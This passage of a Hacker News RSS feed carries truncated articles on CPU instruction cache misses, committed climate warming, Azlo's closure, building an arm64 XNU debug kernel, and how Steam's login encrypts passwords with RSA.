rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Susan J Whiting</span><span>, PhD. Professor Emerita, University of Saskatchewan, Canada.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Richard Mazess</span><span>. PhD. Emeritus Professor, University of Wisconsin, Madison, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Helga Rhein</span><span>, MD (retired). </span><span>Sighthill…</span></p></td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vitamindforall.org/letter.html">https://vitamindforall.org/letter.html</a></em></p>]]>
            </description>
            <link>https://vitamindforall.org/letter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680282</guid>
            <pubDate>Fri, 08 Jan 2021 01:34:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoiding instruction cache misses (2019)]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25680125">thread link</a>) | @nkurz
<br/>
January 7, 2021 | https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/ | <a href="https://web.archive.org/web/*/https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div role="main"><div><article><p>Modern processors are quite complex, with many parts having the potential to become a bottleneck. It is relatively easy to reason about the performance of short pieces of code, especially if memory effects are kept to a minimum. Both static analysis tools like LLVM MCA and microbenchmarks can provide a lot of information in such cases. However, the behaviour of the whole program is not just the sum of those small parts. As the code becomes larger and more complex other effects start appearing. One of such potential problems are excessive instruction cache misses.</p><p>Every program has different properties, and those large-scale effects will affect it differently. However, if its job is to execute complex logic on a small amount of data, the instruction cache is likely to become a problem at some point. The actual impact may vary significantly from codebase to codebase, which is why I won’t show any numbers in this article. Let’s consider this just a collection of ideas, but it is not easy to tell how much any of them will help for a given application.</p><p>First, let’s have a quick look at the processor front end. Below is a simplified diagram of how it is arranged in Skylake, the numbers between units are the maxima per cycle.</p><p><img loading="lazy" width="630" height="860" src="https://paweldziepak.dev/static/icache-front-end.min.2e73578fff.svg" alt="CPU front end"></p><p>Each cycle the processor fetches up to 16 bytes from the instruction cache using information from the Branch Prediction Unit to predict the control flow. The pre-decode unit determines instruction lengths and puts up to five of them in the Instruction Queue. From the Instruction Queue, up to 5 instructions (with macro-fusion) are brought each cycle to the decoders. There is one complex decoder that can handle instructions that translate to up to 4 µops and 3 simple decoders that can handle only single-µop instructions. In total, all decoders are limited to producing no more than 5 µops each cycle. Instructions that require more than 4 µops go through Microcode Sequence ROM, which emits 4 µops per cycle, and while it is active, the decoders are disabled. There is also Decoded ICache (<abbr title="Decoded Stream Buffer">DSB</abbr>) which caches decoded µops. It can emit up to 6 µops each cycle. All µops, regardless of their source, end up in the Instruction Decode Queue (IDQ). The Loop Stream Detector (LSD) detects small loops and keeps them in the queue, so that no fetched, decodes or reads from the DSB are needed during the duration of the loop. IDQ is the last part of the front end, and the queued µops continue to the back end.</p><p>From the instruction cache point of view, the front end has two weaknesses. Firstly, instructions are processed in-order which can severely limit the processor ability to hide latencies of cache misses. HyperThreading can make sure that this part of the processor still does some useful work, but it is also the source of the second problem – all resources, including the L1 instruction cache and µop cache are shared between the hardware threads.</p><p>Modern processors provide various metrics that help monitor their behaviour. However, the task of extracting the relevant data requires a proper approach if it is to be done efficiently. Top-down analysis is invaluable with helping to understand microarchitectural phenomena in large codebases. The idea is to monitor program behaviour with the <abbr title="Performance Monitoring Unit">PMU</abbr> counters and identify the bottleneck starting with the major functional parts of the CPU and then digging deeper narrowing down on the exact source of the problem. It can be done in an automated way by tools like VTune or toplev.</p><pre><code>FE    Frontend_Bound:                                      39.48 +-  0.00 % Slots
BE    Backend_Bound:                                       16.19 +-  0.00 % Slots
    This category represents fraction of slots where no uops are
    being delivered due to a lack of required resources for
    accepting new uops in the Backend...
FE    Frontend_Bound.Frontend_Latency:                     24.92 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Bandwidth:                   13.45 +-  0.00 % Slots
FE    Frontend_Bound.Frontend_Latency.ICache_Misses:       14.45 +-  0.00 % Clocks &lt;==
    This metric represents fraction of cycles the CPU was
    stalled due to instruction cache misses...
    Sampling events:  frontend_retired.l2_miss:pp frontend_retired.l1i_miss:pp
FE    Frontend_Bound.Frontend_Latency.ITLB_Misses:          8.71 +-  0.00 % Clocks
    This metric represents fraction of cycles the CPU was
    stalled due to instruction TLB misses...
    Sampling events:  frontend_retired.stlb_miss:pp frontend_retired.itlb_miss:pp
FE    Frontend_Bound.Frontend_Latency.Branch_Resteers:      8.42 +-  0.00 % Clocks_Est
    This metric represents fraction of cycles the CPU was
    stalled due to Branch Resteers...
    Sampling events:  br_misp_retired.all_branches:u
FE    Frontend_Bound.Frontend_Bandwidth.MITE:              31.93 +-  0.00 % CoreClocks
    This metric represents Core fraction of cycles in which CPU
	was likely limited due to the MITE pipeline (Legacy Decode
    Pipeline)...
</code></pre><p>Above is an example of a toplev result. We can see that the instruction cache misses were the dominating bottleneck. Unsurprisingly instruction TLB misses also show up. On the front end bandwidth side of things, toplev points to the legacy decode pipeline. That makes perfect sense if the instructions are supplied from DSB or LSD, then there are no instruction fetches, and no cache misses.</p><p>Sometimes, the final summary may not provide sufficient information if there are changes in the code behaviour during the test. When that’s the case, a graph is likely to be a much more helpful way of presenting the results.</p><p><img loading="lazy" width="950" height="950" src="https://paweldziepak.dev/static/icache-toplev.min.2b465fdb6f.svg" alt="toplev"></p><p>Tools like toplev are great for initial identification of the problem, but once that’s done what we need is a right way for comparing different solutions. Ultimately, the most important metric is the actual performance of the program in a real-life workload. toplev still can be helpful as it shows the balance between different performance-limiting factors. What also can be useful is <code>perf stat</code> which can show the performance counter statistics. The event most relevant for us is <code>L1-icache-load-misses</code>, though there are more model-specific registers that may be of interest.</p><p>Now, that we know how to diagnose excessive instruction cache misses, let’s see what can be done to deal with this problem.</p><h2 id="avoiding-work">Avoiding work</h2><p>If the number of executed instructions is the problem, the most obvious solution is to try to reduce that number. Obviously, that’s much easier said than done, but there are some common patterns for dealing with this issue. One example would be prepared statements in databases. The general idea is that if a client knows it will send requests that have some commonality, it can tell the database engine early that the requests are going to match specific templates. This information allows the server to do as much work as possible during the preparation stage, thus reducing the amount of logic that needs to be executed for each individual request.</p><p>Extracting common patterns doesn’t have to be explicit. A server or any other kind of an application which actions depend on the user input could attempt to look for repeating patterns and cache some common parts. This is a very vague idea and most likely won’t be easily implementable in a lot of applications, but in some cases may be quite a natural solution. It also shows the main problem with the “just do less” approach – it is very application specific. On the plus, side, if this can be done, it is likely to help with the overall performance, not just the instruction cache misses.</p><p>Another potential problem is making sure that the preparation phase can really do something to help during the execution phase. If that means pre-computing some values, then it’s simple. However, if the only thing that preparation gives us is the knowledge which code paths are going to be exercised and which branches taken during the execution, it is going to be harder to take benefit from it. One option is to have some specialised code for the most common paths, C++ templates may come in handy here. If it is not easy to determine what may be the most common paths, then a just-in-time compiler may be used to generate code in the preparation stage.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><h2 id="batching-work">Batching work</h2><p>So far, we have been trying to reduce the number of executed instructions, by taking advantage of some earlier knowledge to avoiding repeating the same work. In other words, we have introduced two stages:</p><ul><li>preparation, which is performed rarely and, consequently, less performance critical</li><li>execution, which is done many times and is expected to dominate overall performance</li></ul><p>The way this can help with the instruction cache misses is that the execution stage, being smaller, is more likely to fit in the instruction cache. Whether this brings any measurable benefits depends highly on the type of the application and how much logic can be moved from execution to preparation stages.</p><p>We have already split our processing pipeline into preparation and execution stage. If the execution stage can fit in the instruction cache, we are done. However, often, that’s not the case. What we can do to improve the situation more is to split the execution into more stages. This time the goal is not to reuse work as it was with the preparation, but to group entities that need to have the same code executed for them. In other words, if the processing pipeline consists of steps A, B and C the idea is to separate them, add a queue in front of each of those stages, and then cycle through those stages each time handling multiple elements from the queue. Connections between the stages don’t have to be one-to-one, any directed graph is fine.</p><p><img loading="lazy" width="756" height="331" src="https://paweldziepak.dev/static/icache-seda.min.7259b25adc.svg" alt="SEDA diagram"></p><p>In the diagram above, there is one stage that feeds tasks to one of two stages. This could be, for example, a front-end of a database server. The first stage does some initial request processing and then, depending on whether it is a read or write, puts it in the appropriate queue. Each stage processes requests in batches, the first one warms up the instruction …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/">https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</a></em></p>]]>
            </description>
            <link>https://paweldziepak.dev/2019/06/21/avoiding-icache-misses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680125</guid>
            <pubDate>Fri, 08 Jan 2021 01:15:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CO2 already emitted will warm Earth beyond climate targets, study finds]]>
            </title>
            <description>
<![CDATA[
Score 332 | Comments 241 (<a href="https://news.ycombinator.com/item?id=25679618">thread link</a>) | @colinprince
<br/>
January 7, 2021 | https://www.cbc.ca/news/technology/climate-targets-1.5861537 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/technology/climate-targets-1.5861537">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds. But it can be delayed for centuries if governments takes action.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4922800.1543350548!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/us-coal-s-decline.jpg"></p></div><figcaption>Smoke and steam rise from the smokestack of a coal-fired power plant near Ordos in northern China's Inner Mongolia Autonomous Region in 2015.  A new study estimates that 2.3 C of warming is inevitable, but can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.<!-- --> <!-- -->(Mark Schiefelbein/Associated Press)</figcaption></figure><p><span><p>The amount of baked-in global warming, from carbon pollution already in the air, is enough to blow past international agreed upon goals to limit climate change, a new study finds.</p>  <p>But it's not game over because, while that amount of warming may be inevitable, it can be delayed for centuries if the world quickly stops emitting extra greenhouse gases from the burning of coal, oil and natural gas, the study's authors say.</p>  <p>For decades, scientists have talked about so-called "committed warming" or the increase in future temperature based on past carbon dioxide emissions that stay in the atmosphere for well over a century. It's like the distance a speeding car travels after the brakes are applied.</p>  <p>But Monday's <a href="https://www.nature.com/articles/s41558-020-00955-x">study in the journal Nature Climate Change</a> calculates that a bit differently and now figures the carbon pollution already put in the air will push global temperatures to about 2.3 degrees Celsius (4.1 degrees Fahrenheit) of warming since pre-industrial times.</p>  <p>Previous estimates, including those accepted by international science panels, were about a degree Celsius (1.8 degrees Fahrenheit) less than that amount of committed warming.</p>  <p>International climate agreements set goals of limiting warming to 2 C&nbsp;(3.6 F) since pre-industrial times, with the more ambitious goal of limiting it to 1.5 C&nbsp;(2.7 F) added in Paris in 2015. The world has already warmed about 1.1 C&nbsp;(2 F).</p>  <p>"You've got some ... global warming inertia that's going to cause the climate system to keep warming, and that's essentially what we're calculating," said study co-author Andrew Dessler, a climate scientist at Texas A&amp;M University. "Think about the climate system like the Titanic. It's hard to turn the ship when you see the icebergs."</p>  <p>Dessler and colleagues at the Lawrence Livermore National Lab and Nanjing University in China calculated committed warming to take into account that the world has warmed at different rates in different places and that places that haven't warmed as fast are destined to catch up.</p>    <p>Places such as the Southern Ocean, surrounding Antarctica are a bit cooler, and that difference creates low-lying clouds that reflect more sun away from earth, keeping these places cooler. But this situation can't keep going indefinitely because physics dictates that cooler locations will warm up more and when they do, the clouds will dwindle and more heating will occur, Dessler said.</p>  <p>Previous studies were based on the cooler spots staying that way, but Dessler and colleagues say that's not likely.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/greenland-record-melt.jpg 300w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/greenland-record-melt.jpg 460w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/greenland-record-melt.jpg 620w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg 780w,https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/greenland-record-melt.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5693652.1597940952!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/greenland-record-melt.jpg"></p></div><figcaption>In this Aug. 16, 2019 file photo, icebergs float away as the sun rises near Kulusuk, Greenland. Greenland lost a record amount of ice that year. The world has already warmed 1.1 C since pre-industrial times.<!-- --> <!-- -->(Felipe Dana/The Associated Press)</figcaption></figure></span></p>  <h2>More research needed, outside experts say</h2>  <p>Outside experts said the work is based on compelling reasoning, but want more research to show that it's true. Breakthrough Institute climate scientist Zeke Hausfather said the new work fits better with climate models than observational data.</p>  <p>Just because the world is bound to get more warming than international goals, that doesn't mean all is lost in the fight against global warming, said Dessler, who cautioned against what he called "climate doomers."</p>  <p>If the world gets to net zero carbon emissions soon, 2 degrees of global warming could be delayed enough so that it won't happen for centuries, giving society time to adapt or even come up with technological fixes, he said.</p>  <p>"If we don't, we're going to blow through (climate goals) in a few decades," Dessler said. "It's really the rate of warming that makes climate change so terrible. If we got a few degrees over 100,000 years, that would not be that big a deal. We can deal with that. But a few degrees over 100 years is really bad."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/technology/climate-targets-1.5861537</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679618</guid>
            <pubDate>Fri, 08 Jan 2021 00:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go Forth and Azlo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25679475">thread link</a>) | @Seich
<br/>
January 7, 2021 | https://www.azlo.com/blog/go-forth-and-azlo | <a href="https://web.archive.org/web/*/https://www.azlo.com/blog/go-forth-and-azlo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div>
        
      
        <div>
          
          <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><img src="https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=876&amp;name=blog-Azlo%20farewell-lg.jpg" alt="blog-Azlo farewell-lg" width="876" srcset="https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=438&amp;name=blog-Azlo%20farewell-lg.jpg 438w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=876&amp;name=blog-Azlo%20farewell-lg.jpg 876w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=1314&amp;name=blog-Azlo%20farewell-lg.jpg 1314w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=1752&amp;name=blog-Azlo%20farewell-lg.jpg 1752w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=2190&amp;name=blog-Azlo%20farewell-lg.jpg 2190w, https://www.azlo.com/hs-fs/hubfs/blog-Azlo%20farewell-lg.jpg?width=2628&amp;name=blog-Azlo%20farewell-lg.jpg 2628w" sizes="(max-width: 876px) 100vw, 876px"></p>
<p><strong>By Cameron Peake</strong></p>
<!--more-->
<div><p>You may have heard by now that BBVA US, Azlo’s parent bank, has made the strategic decision to <a href="https://www.azlo.com/blog/azlo-status-update"><span>close Azlo’s business</span></a>. After more than four years dedicated to building unparalleled digital banking services for founders, freelancers, and small business owners, we still firmly believe in our vision: giving every small business owner the opportunity to survive and thrive.</p><p>As founders and entrepreneurs ourselves, we know that there can always be unexpected bumps on the entrepreneurial journey, and we’re sorry that we won’t be alongside our inspiring community of entrepreneurs as they grow and flourish.&nbsp;</p><p>In creating Azlo, we worked hard every day to give entrepreneurs and small business owners a helping hand whenever they needed it — whether that was through offering a free online bank account, bringing innovative features like digital Envelopes to life, or hosting informative webinars featuring industry-leading experts. Wherever we could, we wanted to level the playing field and help founders from all walks of life have their best chance at success.</p><p>I’ve been encouraged at the progress that has been made recently, even in the face of a pandemic and a mounting sense of economic uncertainty. The Black Lives Matter movement gave long-deserved and widespread recognition to Black entrepreneurs and encouraged many consumers to seek out and support their businesses. We have been proud to showcase our customers’ businesses — as we did with our <a href="https://www.azlo.com/customers-catalog/"><span>Customer Shopping Catalog</span></a> — and help entrepreneurs learn from each other through the <a href="https://www.azlo.com/blog/category/entrepreneurs/"><span>stories</span></a> you told us.</p><p>This has been a journey we’ve been privileged to be on with all of you. Thank you for being part of our community, to propel us forward, and make us a better business. To our founders, our innovators, and our supporters — you are what makes this world great.&nbsp;</p><p>On a closing note, many ask what “Azlo” means. It’s a play on “<em>Hazlo,</em>” which means “get it done” in Spanish. This phrase to us is the essence of entrepreneurship <span>—</span> you push through the blood, sweat, and tears to reach your goal in whatever way possible. So, to our community:<span>&nbsp;</span><em>Hazlo</em> <span>— </span>we can’t wait to see what you’ll achieve.</p></div></span>
        </p></div>
        
        
        
        <hr>
        
        
        
        
        
        
        <hr>
        <p><a href="https://www.azlo.com/blog"><img src="https://www.azlo.com/hubfs/raw_assets/public/Azlo_July2020_v2/images/icon-arrow-left.svg" alt="Icon arrow left">Back to Blog</a>
      </p></div>  
    </div>
  </div>
  
  
  
</div></div>]]>
            </description>
            <link>https://www.azlo.com/blog/go-forth-and-azlo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679475</guid>
            <pubDate>Fri, 08 Jan 2021 00:03:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Arm 64-bit XNU (Darwin 20) – random blog]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25679406">thread link</a>) | @tambourine_man
<br/>
January 7, 2021 | https://threedots.ovh/blog/2021/01/building-arm-64-bit-xnu-darwin-20/ | <a href="https://web.archive.org/web/*/https://threedots.ovh/blog/2021/01/building-arm-64-bit-xnu-darwin-20/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-114">

	

	<div>
		
<p>Assuming that instructions from <a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html</a> were already followed including for the iPhoneOS target…</p>



<p>The patch:</p>



<pre><code>diff --git a/config/Private.exports b/config/Private.exports
index 28b023dd..ebaba915 100644
--- a/config/Private.exports
+++ b/config/Private.exports
@@ -589,15 +589,6 @@ _current_persona_get
 _persona_put
 _pffinddomain:_pffinddomain_old
 _pffindproto:_pffindproto_old
-_pmap_claim_reserved_ppl_page
-_pmap_free_reserved_ppl_page
-_pmap_in_ppl
-_pmap_is_trust_cache_loaded
-_pmap_load_legacy_trust_cache
-_pmap_load_image4_trust_cache
-_pmap_lockdown_image4_slab
-_pmap_lookup_in_static_trust_cache
-_pmap_lookup_in_loaded_trust_caches
 _port_name_to_task
 _port_name_to_thread
 _post_sys_powersource
diff --git a/makedefs/MakeInc.def b/makedefs/MakeInc.def
index d53f3e1a..6e646215 100644
--- a/makedefs/MakeInc.def
+++ b/makedefs/MakeInc.def
@@ -65,8 +65,8 @@ MACHINE_FLAGS_ARM64_S8000 = -DARM64_BOARD_CONFIG_S8000
 MACHINE_FLAGS_ARM64_S8001 = -DARM64_BOARD_CONFIG_S8001
 MACHINE_FLAGS_ARM_T8002 = -DARM_BOARD_CONFIG_T8002
 MACHINE_FLAGS_ARM_T8004 = -DARM_BOARD_CONFIG_T8004
-MACHINE_FLAGS_ARM64_T8010 = -DARM64_BOARD_CONFIG_T8010 -mcpu=hurricane
-MACHINE_FLAGS_ARM64_T8011 = -DARM64_BOARD_CONFIG_T8011 -mcpu=hurricane
+MACHINE_FLAGS_ARM64_T8010 = -DARM64_BOARD_CONFIG_T8010 -mcpu=apple-a10
+MACHINE_FLAGS_ARM64_T8011 = -DARM64_BOARD_CONFIG_T8011 -mcpu=apple-a10
 MACHINE_FLAGS_ARM64_BCM2837 = -DARM64_BOARD_CONFIG_BCM2837
 
 
diff --git a/osfmk/arm64/amcc_rorgn.c b/osfmk/arm64/amcc_rorgn.c
index 35128d53..fe0c6f80 100644
--- a/osfmk/arm64/amcc_rorgn.c
+++ b/osfmk/arm64/amcc_rorgn.c
@@ -42,7 +42,6 @@
 #include &lt;arm/pmap.h&gt;
 #include &lt;arm64/tlb.h&gt;
 #include &lt;arm64/amcc_rorgn.h&gt;
-#include &lt;memmap_types.h&gt;
 
 #if HIBERNATION
 #include &lt;arm64/pal_hibernate.h&gt;
diff --git a/osfmk/arm64/locore.s b/osfmk/arm64/locore.s
index b18a335e..1996e094 100644
--- a/osfmk/arm64/locore.s
+++ b/osfmk/arm64/locore.s
@@ -27,7 +27,6 @@
  */
 
 #include &lt;machine/asm.h&gt;
-#include &lt;arm64/hv/hv_regs.h&gt;
 #include &lt;arm64/machine_routines_asm.h&gt;
 #include &lt;arm64/proc_reg.h&gt;
 #include &lt;pexpert/arm64/board_config.h&gt;
diff --git a/pexpert/pexpert/arm64/board_config.h b/pexpert/pexpert/arm64/board_config.h
index 01265fdf..7adb0f23 100644
--- a/pexpert/pexpert/arm64/board_config.h
+++ b/pexpert/pexpert/arm64/board_config.h
@@ -81,7 +81,7 @@
 #define MAX_L2_CLINE                   7
 
 #if DEVELOPMENT || DEBUG
-#define PMAP_CS                        1
+//#define PMAP_CS                        1
 #define PMAP_CS_ENABLE                 0
 #endif
 #endif  /* ARM64_BOARD_CONFIG_T8010 */
@@ -94,7 +94,7 @@
 #define MAX_CPU_CLUSTERS               1
 
 #if DEVELOPMENT || DEBUG
-#define PMAP_CS                        1
+//#define PMAP_CS                        1
 #define PMAP_CS_ENABLE                 0
 #endif
 #endif  /* ARM64_BOARD_CONFIG_T8011 */
@@ -109,7 +109,7 @@
 #define BROKEN_FRIGGING_SLEEP          1 /* Spurious wake: See rdar://problem/29762505 */
 
 #if DEVELOPMENT || DEBUG
-#define PMAP_CS                        1
+//#define PMAP_CS                        1
 #define PMAP_CS_ENABLE                 0
 #endif
 #endif  /* ARM64_BOARD_CONFIG_T8015 */
@@ -126,8 +126,8 @@
 #define T8020_DART_ALLOW_BYPASS        (1 &lt;&lt; 1) /* DART allows translation bypass in certain cases */
 #define XNU_MONITOR_NVME_PPL           1 /* NVMe PPL plugin for secure pmap runtime */
 #define XNU_MONITOR_ANS2_SART          1 /* ANS2 SART plugin for secure pmap runtime */
-#define PMAP_CS                        1
-#define PMAP_CS_ENABLE                 1
+//#define PMAP_CS                        1
+//#define PMAP_CS_ENABLE                 1
 #endif  /* ARM64_BOARD_CONFIG_T8020 */
 
 #ifdef ARM64_BOARD_CONFIG_T8006
@@ -151,8 +151,8 @@
 #define T8020_DART_ALLOW_BYPASS        (1 &lt;&lt; 1) /* DART allows translation bypass in certain cases */
 #define XNU_MONITOR_NVME_PPL           1 /* NVMe PPL plugin for secure pmap runtime */
 #define XNU_MONITOR_ANS2_SART          1 /* ANS2 SART plugin for secure pmap runtime */
-#define PMAP_CS                        1
-#define PMAP_CS_ENABLE                 1
+//#define PMAP_CS                        1
+//#define PMAP_CS_ENABLE                 1
 #define PREFER_ARM64_32_BINARIES
 #define PEXPERT_NO_3X_IMAGES           1
 #endif /* ARM64_BOARD_CONFIG_T8006 */
@@ -169,8 +169,8 @@
 #define T8020_DART_ALLOW_BYPASS        (1 &lt;&lt; 1) /* DART allows translation bypass in certain cases */
 #define XNU_MONITOR_NVME_PPL           1 /* NVMe PPL plugin for secure pmap runtime */
 #define XNU_MONITOR_ANS2_SART          1 /* ANS2 SART plugin for secure pmap runtime */
-#define PMAP_CS                        1
-#define PMAP_CS_ENABLE                 1
+//#define PMAP_CS                        1
+//#define PMAP_CS_ENABLE                 1
 #endif  /* ARM64_BOARD_CONFIG_T8027 */
 
 #ifdef ARM64_BOARD_CONFIG_T8028
@@ -185,8 +185,8 @@
 #define T8020_DART_ALLOW_BYPASS        (1 &lt;&lt; 1) /* DART allows translation bypass in certain cases */
 #define XNU_MONITOR_NVME_PPL           1 /* NVMe PPL plugin for secure pmap runtime */
 #define XNU_MONITOR_ANS2_SART          1 /* ANS2 SART plugin for secure pmap runtime */
-#define PMAP_CS                        1
-#define PMAP_CS_ENABLE                 1
+//#define PMAP_CS                        1
+//#define PMAP_CS_ENABLE                 1
 #endif  /* ARM64_BOARD_CONFIG_T8028 */
 
 #ifdef ARM64_BOARD_CONFIG_T8030
@@ -202,8 +202,8 @@
 #define XNU_MONITOR_NVME_PPL           1 /* NVMe PPL plugin for secure pmap runtime */
 #define XNU_MONITOR_ANS2_SART          1 /* ANS2 SART plugin for secure pmap runtime */
 #define XNU_MONITOR_UAT_PPL            1 /* UAT PPL plugin for secure pmap runtime */
-#define PMAP_CS                        1
-#define PMAP_CS_ENABLE                 1
+//#define PMAP_CS                        1
+//#define PMAP_CS_ENABLE                 1
 #endif  /* ARM64_BOARD_CONFIG_T8030 */
</code></pre>



<p>The build command line:</p>



<pre><code>make SDKROOT=iphoneos  ARCH_CONFIGS=ARM64 KERNEL_CONFIGS=DEBUG MACHINE_CONFIGS=T8010 ARCH_STRING_FOR_CURRENT_MACHINE_CONFIG=arm64 USE_WERROR=0</code></pre>



<p>Of course, without kexts that’s not very useful for now… and most macOS arm64 stuff isn’t included yet.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://threedots.ovh/blog/2021/01/building-arm-64-bit-xnu-darwin-20/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679406</guid>
            <pubDate>Thu, 07 Jan 2021 23:55:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Steam's login method is kinda interesting]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25679209">thread link</a>) | @todsacerdoti
<br/>
January 7, 2021 | https://owlspace.xyz/cybersec/steam-login/ | <a href="https://web.archive.org/web/*/https://owlspace.xyz/cybersec/steam-login/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><header></header><p>How do you send a password over the internet? You acquire a SSL certificate and let TLS do the job of securely transporting the password from client to server. Of course it’s not as cut-and-dry as I’m making it out to be, but the gist of it holds true and stood the test of time. This hasn’t always been this way though, and one incredibly popular storefront on the world wide web prefers to add a little extra to this day. I’ll be discussing Steam’s unique method of logging in their users, and go down a deep rabbit hole of fascinating implementation details.</p><h3 id="pointing-out-the-obvious">Pointing out the obvious</h3><p>I found a StackOverflow question from 2013 <a href="https://stackoverflow.com/questions/1582894/how-to-send-password-securely-over-http">asking how to securely send a password over HTTP</a>. The answers are pretty unanimous: get a SSL certificate. Here’s an experiment: set up your favorite traffic-capturing proxy, browse to a service you frequently use, log in with your account (or preferably a throwaway), and inspect the requests. You will most certainly find that your username and password are sent as-is in a HTTP request body. The only reason this works is because your connection to the server is encrypted using TLS.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/so-real-host.png" alt="StackOverflow user asking what to do if a webhost doesn't support SSL certificates, told to move to a real webhost"><figcaption><p>Weird to think that this used to be an issue</p></figcaption></figure><p>The internet was a different place though in the early 2010s, let alone the many years prior. We now have services like <a href="https://letsencrypt.org/">Let’s Encrypt</a> which issue SSL certificates free of charge for a period of three months, with automatic renewals if desired. There really wasn’t much of a way around acquiring a SSL certificate for money, but usually with extended validity and support. You could certainly argue that there is a price to be paid for the security and privacy of your users, but that didn’t stop questions like the one I linked from appearing.</p><p>Now that we all agree that TLS is important, let’s switch it up. Let’s pretend we cannot send a password over HTTPS and have to somehow make it work with plain HTTP, while also providing users with some level of security. There’s the <code>Authorization</code> header which is standardized and widely accepted. However, in conjunction with the “Basic” HTTP Authentication scheme, it provides no security if used in plain HTTP.</p><p>There are tried and tested challenge-response algorithms, most notably <a href="https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol">SRP</a> which is designed to do password-based authentication without ever actually sending the password, but you probably have to implement them yourself and a slight oversight could cause serious harm. You could also defer authentication to an external service. “Sign in with service XYZ” is commonly used, but comes with its own ramifications. All things considered, it’s not trivial to send secrets over an inheretly insecure connection.</p><p>So when me and a friend took Steam apart in search for traces of personally identifiable information, I was surprised to see that Steam’s login page doesn’t only rely on TLS to ensure that your password stays protected.</p><h3 id="crypto-cherry-on-top">Crypto cherry on top</h3><p>Again, grab your favorite traffic-capturing proxy and navigate to <a href="https://store.steampowered.com/login">Steam’s login page</a>. Enter your username and password and you will (hopefully) be asked to enter a one-time token generated by your preferred two-factor authentication method. You can stop right there, because the magic I want to point out has already happened. You’ll find that pressing the login button launches a request against an odd endpoint: <code>/login/getrsakey</code>, followed by <code>/login/dologin</code>.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/getrsa-call.png" alt="Requests to fetch script assets, acquire RSA key and perform login"><figcaption><p>All relevant assets and 